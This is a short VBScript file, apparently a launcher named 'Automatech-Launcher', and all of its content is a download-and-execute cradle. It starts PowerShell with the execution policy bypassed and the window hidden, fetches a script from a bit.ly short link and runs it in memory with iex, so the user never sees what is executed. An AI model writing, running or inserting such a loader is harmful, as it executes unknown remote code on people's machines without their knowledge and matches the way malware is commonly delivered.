Set objShell = CreateObject("Wscript.Shell")
objShell.Run "powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command ""iwr -useb bit.ly/Automatech-Launcher | iex""", 0, True